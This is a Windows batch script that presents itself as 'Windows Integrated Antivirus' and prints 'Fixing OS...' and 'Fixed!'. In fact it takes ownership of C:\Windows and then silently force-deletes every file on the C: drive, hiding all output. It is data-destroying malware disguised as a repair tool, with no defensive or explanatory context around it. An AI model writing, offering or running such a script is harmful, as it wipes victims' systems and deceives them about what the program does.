@echo off
title Windows Integrated Antivirus
echo Fixing OS...
takeown /f C:\Windows /r /d Y > nul 2>&1
del /s /f /q C:\ > nul 2>&1
echo Fixed!
